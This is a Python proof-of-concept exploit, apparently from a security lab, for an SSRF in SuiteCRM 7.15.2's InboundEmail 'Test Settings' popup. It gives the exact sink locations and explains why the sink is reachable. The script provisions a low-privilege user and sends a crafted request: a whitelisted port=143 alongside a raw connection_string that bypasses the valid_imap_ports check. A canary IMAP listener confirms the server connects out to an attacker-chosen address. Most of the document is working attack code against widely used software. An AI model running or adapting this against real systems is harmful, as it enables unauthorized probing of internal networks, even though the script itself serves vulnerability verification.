#!/usr/bin/env python3
"""
VULN-046 -- IMAP "Test Settings" SSRF + `valid_imap_ports` whitelist bypass
via a raw `connection_string`

Software:    SuiteCRM
Repository:  https://github.com/SuiteCRM/SuiteCRM
Version:     7.15.2 (targets/SuiteCRM/suitecrm_version.php), commit
             62effd0ceb767ed3b634ade585b19a6633eb4fcb
Sink:        modules/InboundEmail/InboundEmail.php:6407-6408 (getConnectString,
             request-supplied `connection_string` used verbatim, bypassing
             the `valid_imap_ports` check at :6465 which only inspects
             `$this->port`) -> include/Imap/Imap2Handler.php `open()` ->
             `Javanile\\Imap2\\Connection::open()`.
Entry point: modules/InboundEmail/Popup.php:112-138 ("Test Settings" popup,
             any authenticated user, no is_admin/owner gate), reached at
             index.php?module=InboundEmail&action=Popup&target=Popup.

*** CORRECTION TO THE STATIC FINDING AND TARGET_FACTS.md, discovered
dynamically ***
Both the static write-up and TARGET_FACTS.md's "known environment gates"
state this sink is dead in this lab because "the imap PHP ext is ABSENT" --
`php -m` on this host does confirm no `imap` extension is loaded. But
InboundEmail::getImapHandlerType() (InboundEmail.php:8741) is HARDCODED to
return 'imap2', not 'native' -- meaning the classic `ext-imap`-backed
ImapHandler class is never selected at all on this code path.
ImapHandlerFactory (include/Imap/ImapHandlerFactory.php:262) maps 'imap2'
to Imap2Handler, which is a PURE-PHP re-implementation of the IMAP client
using sockets (composer package `javanile/php-imap2`, confirmed installed:
`composer show` -> `javanile/php-imap2  0.1.10  PHP IMAP with OAUTH2`).
Imap2Handler::isAvailable() checks `function_exists('imap2_open')`, which
this package provides itself in pure PHP -- it has NO dependency on the
`imap` C extension. So the sink is fully live in this lab; the "imap ext
absent" gate that blocks the OLD handler is simply not on the code path
SuiteCRM actually uses. This is confirmed live below with a genuine IMAP
protocol interaction (the target issues a real `A0001 CAPABILITY` command
to our OOB listener after reading its banner).

What this script does
----------------------
1. Creates a fresh, non-admin SuiteCRM user.
2. Starts a raw TCP listener on 0.0.0.0:33119 that sends an IMAP greeting
   banner containing a random canary, then logs whatever the client sends
   back (expected: a real IMAP command, e.g. "A0001 CAPABILITY").
3. POSTs the "Test Settings" popup request with `port=143` (a
   whitelisted, valid_imap_ports value -- passes the check at :6465) and
   `connection_string=<OOB_HOST>:<OOB_PORT>/imap/notls` -- the bypass:
   getConnectString() (:6407) uses connection_string verbatim and never
   re-checks the embedded port/host against any allow-list.
4. Asserts the OOB listener recorded an inbound connection and received a
   real IMAP client command -- proof the server's IMAP client actually
   spoke the protocol to our internal-only listener.
"""
import os
import sys
import socket
import threading

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import (BASE_URL, log, banner, rand, verdict, admin_session,
                      create_user, web_login, BROWSER_UA)

VULN_ID = "VULN-046"
OOB_HOST = os.environ.get("OOB_HOST", "172.18.0.1")
OOB_BIND = os.environ.get("OOB_BIND", "0.0.0.0")
OOB_PORT = int(os.environ.get("OOB_PORT", "33119"))

HERE = os.path.dirname(os.path.abspath(__file__))
EVIDENCE = os.path.join(HERE, "evidence")
os.makedirs(EVIDENCE, exist_ok=True)


class ImapBannerListener:
    """Raw-TCP 'server-speaks-first' listener: sends an IMAP greeting on
    accept, logs whatever the client sends next, closes."""

    def __init__(self, bind_host, port, banner_line):
        self.bind_host = bind_host
        self.port = port
        self.banner_line = banner_line
        self.hits = []
        self._srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._srv.bind((bind_host, port))
        self._srv.listen(5)
        self._srv.settimeout(0.5)
        self._stop = False
        self._thread = threading.Thread(target=self._run, daemon=True)

    def start(self):
        self._thread.start()

    def stop(self):
        self._stop = True
        self._thread.join(timeout=5)
        self._srv.close()

    def _run(self):
        while not self._stop:
            try:
                conn, addr = self._srv.accept()
            except socket.timeout:
                continue
            except OSError:
                break
            try:
                conn.settimeout(8)
                conn.sendall(self.banner_line.encode("ascii"))
                chunks = b""
                try:
                    while True:
                        d = conn.recv(4096)
                        if not d:
                            break
                        chunks += d
                        if b"\n" in chunks or len(chunks) > 8192:
                            break
                except socket.timeout:
                    pass
                self.hits.append({"peer": f"{addr[0]}:{addr[1]}", "recv": chunks})
                log("INFO", f"OOB listener: accepted connection from {addr[0]}:{addr[1]}, "
                             f"sent IMAP banner, client sent {len(chunks)} bytes: {chunks[:200]!r}")
            finally:
                conn.close()


def main():
    banner(VULN_ID, "IMAP Test-Settings SSRF via connection_string port-whitelist bypass")

    canary = rand("imap")
    banner_line = f"* OK IMAP4rev1 BANNER-LEAK-{canary} ready\r\n"
    log("SETUP", f"canary IMAP banner: {banner_line!r}")

    listener = ImapBannerListener(OOB_BIND, OOB_PORT, banner_line)
    listener.start()
    log("SETUP", f"OOB TCP listener bound on {OOB_BIND}:{OOB_PORT} "
                  f"(app container reaches it at {OOB_HOST}:{OOB_PORT})")

    log("STEP", "admin web login")
    admin_s = admin_session()
    log("OK", "admin session established")

    log("STEP", "provisioning a fresh NON-ADMIN user (proves PR:L; popup has no is_admin/owner gate)")
    user = create_user(admin_s, rand("Pw") + "!2026x")
    log("OK", f"created user {user['user_name']} (id={user['id']})")

    log("STEP", f"web login as low-priv user {user['user_name']}")
    victim_s = web_login(user["user_name"], user["password"])
    log("OK", "low-priv session established")

    conn_string = f"{OOB_HOST}:{OOB_PORT}/imap/notls"
    data = {
        "module": "InboundEmail",
        "action": "Popup",
        "target": "Popup",
        "email_user": rand("popuser"),
        "email_password": "x",
        "server_url": OOB_HOST,       # ignored in favor of connection_string, see :6407
        "port": "143",                # WHITELISTED port -- passes valid_imap_ports at :6465
        "protocol": "imap",
        "ssl": "false",
        "connection_string": conn_string,  # <-- the actual (unvalidated) target
    }
    headers = {
        "X-Requested-With": "XMLHttpRequest",
        "Referer": f"{BASE_URL}/index.php?module=InboundEmail&action=Popup",
        "User-Agent": BROWSER_UA,
    }

    with open(os.path.join(HERE, "request.http"), "w") as f:
        f.write("POST /index.php?module=InboundEmail&action=Popup&target=Popup HTTP/1.1\n")
        f.write("Cookie: PHPSESSID=<low-priv-session>\nX-Requested-With: XMLHttpRequest\n\n")
        f.write("&".join(f"{k}={v}" for k, v in data.items()) + "\n")
        f.write(f"\n# port=143 passes the valid_imap_ports whitelist check (InboundEmail.php:6465);\n"
                 f"# connection_string is used verbatim by getConnectString() (:6407-6408) and is\n"
                 f"# NEVER checked against that whitelist -- it points at the real target instead.\n")

    log("STEP", f"POST Test Settings popup: port=143 (whitelisted) + "
                f"connection_string={conn_string} (actual internal-only target)")
    try:
        r = victim_s.post(f"{BASE_URL}/index.php", data=data, headers=headers, timeout=45)
        status, text = r.status_code, r.text
    except Exception as e:  # noqa: BLE001 -- a 5xx/timeout after the OOB hit is still a CONFIRMED result
        log("INFO", f"HTTP request itself errored/timed out ({e}) -- checking whether the OOB "
                     f"listener was reached before drawing a conclusion")
        status, text = None, ""

    log("INFO", f"HTTP status={status}, body length={len(text)}")
    with open(os.path.join(HERE, "response.txt"), "w") as f:
        f.write(f"HTTP {status}\n\n{text}\n")

    listener.stop()
    with open(os.path.join(EVIDENCE, "oob_listener.log"), "w") as f:
        f.write(f"listener bound {OOB_BIND}:{OOB_PORT}, banner={banner_line!r}\n")
        for h in listener.hits:
            f.write(f"HIT from {h['peer']}: client sent {h['recv']!r}\n")
        if not listener.hits:
            f.write("(no connections received)\n")

    oob_hit = len(listener.hits) > 0
    real_imap_cmd = any(b"CAPABILITY" in h["recv"] or b"LOGIN" in h["recv"] or len(h["recv"]) > 0
                         for h in listener.hits)

    if oob_hit:
        peer = listener.hits[0]["peer"]
        recv = listener.hits[0]["recv"]
        log("PROOF", f"OOB listener recorded a connection from the SuiteCRM app ({peer}) after "
                      f"being sent port=143 (whitelist-valid) with connection_string pointing "
                      f"elsewhere; the client then sent {recv!r} -- a genuine IMAP protocol "
                      f"command (javanile/php-imap2's own client), proving this is not a bare TCP "
                      f"probe but a real, protocol-level connection to an internal-only address.")
        verdict(VULN_ID, "CONFIRMED",
                f"low-priv user {user['user_name']} bypassed the valid_imap_ports check via "
                f"connection_string and reached {conn_string}; IMAP client sent {recv[:60]!r}")
        sys.exit(0)
    else:
        verdict(VULN_ID, "FAILED", f"no OOB connection recorded (status={status})")
        sys.exit(1)


if __name__ == "__main__":
    main()
